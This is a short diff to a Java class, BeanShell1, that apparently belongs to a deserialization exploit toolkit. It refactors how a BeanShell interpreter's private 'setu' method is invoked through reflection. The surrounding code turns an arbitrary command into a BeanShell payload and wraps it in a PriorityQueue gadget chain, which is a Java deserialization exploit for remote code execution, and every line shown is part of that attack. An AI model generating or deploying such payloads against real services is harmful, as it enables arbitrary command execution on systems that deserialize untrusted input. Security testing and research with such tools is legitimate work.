@@ -4,7 +4,6 @@ import bsh.Interpreter;
 import bsh.XThis;
 
 import java.lang.reflect.InvocationHandler;
-import java.lang.reflect.Method;
 import java.lang.reflect.Proxy;
 import java.util.Comparator;
 import java.util.PriorityQueue;
@@ -26,9 +25,7 @@ public class BeanShell1 implements ObjectPayload<PriorityQueue> {
 	public PriorityQueue getObject(String command) throws Exception {
 		String      payload = BeanShellUtil.makeBeanShellPayload(command);
 		Interpreter i       = new Interpreter();
-		Method setu = i.getClass().getDeclaredMethod("setu",new Class[]{String.class,Object.class});
-		setu.setAccessible(true);
-		setu.invoke(i,new Object[]{"bsh.cwd","."});
+		Reflections.getMethodAndInvoke(i, "setu", new Class[]{String.class, Object.class}, new Object[]{"bsh.cwd", "."});
 		i.eval(payload);
 		XThis                      xt            = new XThis(i.getNameSpace(), i);
 		InvocationHandler          handler       = (InvocationHandler) Reflections.getField(xt.getClass(), "invocationHandler").get(xt);
